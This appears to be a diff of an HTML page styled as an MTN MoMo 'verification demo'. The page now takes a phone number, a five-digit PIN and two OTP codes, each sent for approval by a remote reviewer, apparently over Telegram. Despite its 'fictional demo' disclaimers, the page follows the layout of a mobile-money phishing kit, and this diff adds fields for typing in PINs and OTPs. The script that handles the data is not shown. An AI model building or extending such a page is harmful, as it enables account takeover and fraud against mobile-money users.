@@ -3,69 +3,349 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <title>MoMo Verification Demo</title>
+
   <link rel="stylesheet" href="style.css">
+
+  <style>
+    .demo-input {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+      padding: 14px;
+      margin: 12px 0 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    .demo-label {
+      display: block;
+      margin-top: 18px;
+      font-weight: 600;
+      text-align: left;
+    }
+
+    .notice {
+      padding: 12px;
+      margin: 16px 0;
+      border-radius: 8px;
+      background: #fff4d6;
+      color: #684d00;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .sample-message {
+      padding: 14px;
+      margin: 16px 0;
+      border-radius: 8px;
+      background: #f2f6f5;
+      overflow-wrap: anywhere;
+    }
+
+    .spinner {
+      width: 42px;
+      height: 42px;
+      margin: 20px auto;
+      border: 5px solid #e0e0e0;
+      border-top-color: #087f5b;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .success-symbol {
+      color: #087f5b;
+      font-size: 52px;
+    }
+
+    .decline-symbol {
+      color: #c92a2a;
+      font-size: 52px;
+    }
+
+    .hint {
+      font-size: 14px;
+      overflow-wrap: anywhere;
+    }
+
+    button {
+      cursor: pointer;
+    }
+  </style>
 </head>
+
 <body>
-  <header><span class="brand-mark">M</span><strong>MoMo Verification Demo</strong><span class="demo-tag">DEMO</span></header>
+
+  <header>
+    <span class="brand-mark">M</span>
+    <strong>MoMo Verification Demo</strong>
+    <span class="demo-tag">DEMO</span>
+  </header>
+
   <main class="card">
-    <div class="progress"><span id="stepNumber">Step 1 of 7</span><div class="track"><i id="progressBar"></i></div></div>
 
+    <div class="progress">
+      <span id="stepNumber">Step 1 of 7</span>
+      <div class="track">
+        <i id="progressBar"></i>
+      </div>
+    </div>
+
+    <!-- HOME PAGE -->
     <section class="page active" id="homePage">
-      <div class="symbol">📱</div><h1>Verification Demo</h1>
-      <p>A simulated verification-style workflow using predefined dummy values only.</p>
-      <div class="notice">Not an official MTN service. Never enter real credentials or real SMS messages.</div>
-      <button id="startBtn">Start Demo →</button>
+
+      <div class="symbol">📱</div>
+
+      <h1>Verification Demo</h1>
+
+      <p>
+        Explore a simulated verification workflow using fictional
+        demonstration data.
+      </p>
+
+      <div class="notice">
+        This is an independent demonstration, not an official MTN
+        service. Never enter real financial PINs, real OTPs, or
+        private SMS messages.
+      </div>
+
+      <button id="startBtn" type="button">
+        Start Demo →
+      </button>
+
     </section>
 
+    <!-- NUMBER PAGE -->
     <section class="page" id="numberPage">
-      <div class="symbol">☎️</div><h1>Enter a Demo Number</h1>
-      <p>Use the sample number displayed here. It is not submitted anywhere.</p>
-      <div class="sample-message">Sample number: <strong>0700000000</strong></div>
-      <button id="numberBtn">Continue</button>
+
+      <div class="symbol">☎️</div>
+
+      <h1>Demo Number</h1>
+
+      <p>
+        Enter a fictional test number. This value remains in the
+        browser and is not sent to Telegram.
+      </p>
+
+      <label class="demo-label" for="demoNumber">
+        Test number
+      </label>
+
+      <input
+        class="demo-input"
+        id="demoNumber"
+        type="text"
+        inputmode="numeric"
+        maxlength="15"
+        autocomplete="off"
+        placeholder="Enter a fictional number"
+      >
+
+      <button id="numberBtn" type="button">
+        Continue
+      </button>
+
     </section>
 
+    <!-- DUMMY PIN PAGE -->
     <section class="page" id="pinPage">
-      <div class="symbol">🔒</div><h1>Dummy PIN</h1>
-      <p>Use the predefined sample value shown below. No PIN entry is needed.</p>
-      <div class="sample-message">Demo PIN: <strong>12345</strong></div>
-      <button id="pinBtn">Continue Demo</button>
+
+      <div class="symbol">🔒</div>
+
+      <h1>Dummy PIN</h1>
+
+      <p>
+        Enter any five-digit fictional test PIN.
+        Do not use a real financial PIN.
+      </p>
+
+      <label class="demo-label" for="demoPin">
+        Five-digit test PIN
+      </label>
+
+      <input
+        class="demo-input"
+        id="demoPin"
+        type="password"
+        inputmode="numeric"
+        maxlength="5"
+        autocomplete="off"
+        placeholder="Enter five test digits"
+      >
+
+      <button id="pinBtn" type="button">
+        Request Demo Review
+      </button>
+
     </section>
 
+    <!-- LOADING / REVIEW PAGE -->
     <section class="page" id="loadingPage">
-      <div class="spinner"></div><h1>Processing Demo</h1>
-      <p>Please wait while the demo review is requested.</p>
-      <div class="timer"><span>Time remaining</span><strong id="seconds">5s</strong></div>
-      <p id="reviewStatus" class="hint">Waiting for Telegram review…</p>
+
+      <div class="spinner" aria-label="Loading"></div>
+
+      <h1>Processing Demo</h1>
+
+      <p>
+        Waiting for the demonstration reviewer to make a decision.
+      </p>
+
+      <div class="timer">
+        <span>Time remaining</span>
+        <strong id="seconds">5s</strong>
+      </div>
+
+      <p
+        id="reviewStatus"
+        class="hint"
+        role="status"
+        aria-live="polite"
+      >
+        Waiting for demo review…
+      </p>
+
     </section>
 
+    <!-- OTP 1 PAGE -->
     <section class="page" id="otp1Page">
-      <div class="symbol">💬</div><h1>OTP 1 — Sample SMS Message</h1>
-      <p>Use this synthetic message to simulate copying a message from a normal SMS inbox. Do not use a real SMS.</p>
-      <div class="sample-message">Demo SMS: “Your sample verification message is DEMO-482736. This is not a real code.”</div>
-      <button id="otp1Btn">Use Sample Message</button>
+
+      <div class="symbol">💬</div>
+
+      <h1>OTP 1 — Sample Message</h1>
+
+      <p>
+        Use a fictional four-digit test code for this demonstration.
+        Do not copy real authentication messages from your SMS inbox.
+      </p>
+
+      <div class="sample-message">
+        <strong>Example SMS</strong>
+        <p>
+          Your fictional demonstration code is 4827.
+          This is a sample message and is not a real authentication code.
+        </p>
+      </div>
+
+      <label class="demo-label" for="demoOtp1">
+        Synthetic test code
+      </label>
+
+      <input
+        class="demo-input"
+        id="demoOtp1"
+        type="text"
+        inputmode="numeric"
+        maxlength="4"
+        autocomplete="off"
+        placeholder="Enter four test digits"
+      >
+
+      <button id="otp1Btn" type="button">
+        Request Demo Review
+      </button>
+
     </section>
 
+    <!-- OTP 2 PAGE -->
     <section class="page" id="otp2Page">
-      <div class="symbol">🔢</div><h1>OTP 2 — Dummy Code</h1>
-      <p>Use this predefined test code. Do not use a real OTP.</p>
-      <div class="sample-message">Demo code: <strong>222222</strong></div>
-      <button id="otp2Btn">Use Sample Code</button>
+
+      <div class="symbol">🔢</div>
+
+      <h1>OTP 2 — Sample Code</h1>
+
+      <p>
+        Enter any four-digit fictional test code.
+        It will not be transmitted to Telegram.
+      </p>
+
+      <div class="sample-message">
+        <strong>Sample code: 2222</strong>
+        <p>
+          This code is for demonstration purposes only.
+        </p>
+      </div>
+
+      <label class="demo-label" for="demoOtp2">
+        Synthetic test code
+      </label>
+
+      <input
+        class="demo-input"
+        id="demoOtp2"
+        type="text"
+        inputmode="numeric"
+        maxlength="4"
+        autocomplete="off"
+        placeholder="Enter four test digits"
+      >
+
+      <button id="otp2Btn" type="button">
+        Request Demo Review
+      </button>
+
     </section>
 
+    <!-- SUCCESS PAGE -->
     <section class="page" id="successPage">
-      <div class="symbol success-symbol">✓</div><h1>Demo Completed</h1>
-      <p>The demonstration workflow completed successfully.</p>
-      <button id="restartSuccess">Start Again</button>
+
+      <div class="symbol success-symbol">✓</div>
+
+      <h1>Demo Completed</h1>
+
+      <p>
+        All demonstration stages have been approved.
+        The simulated workflow is complete.
+      </p>
+
+      <div class="notice">
+        This result confirms completion of the demonstration only.
+        It does not verify a real account or financial transaction.
+      </div>
+
+      <button id="restartSuccess" type="button">
+        Start Again
+      </button>
+
     </section>
 
+    <!-- DECLINE PAGE -->
     <section class="page" id="declinePage">
-      <div class="symbol decline-symbol">✕</div><h1>Demo Declined</h1>
-      <p>The demo reviewer declined this stage.</p>
-      <button id="restartDecline">Try Again</button>
+
+      <div class="symbol decline-symbol">✕</div>
+
+      <h1>Demo Declined</h1>
+
+      <p>
+        The reviewer declined this demonstration stage.
+      </p>
+
+      <p>
+        You can restart the fictional demonstration if you want to
+        try the workflow again.
+      </p>
+
+      <button id="restartDecline" type="button">
+        Try Again
+      </button>
+
     </section>
+
   </main>
-  <footer>Demo only · Telegram receives predefined synthetic examples, never visitor-entered credentials or messages.</footer>
+
+  <footer>
+    Demo only · Uses fictional test data · No real credentials
+    or private SMS messages are transmitted.
+  </footer>
+
   <script src="script.js"></script>
+
 </body>
 </html>
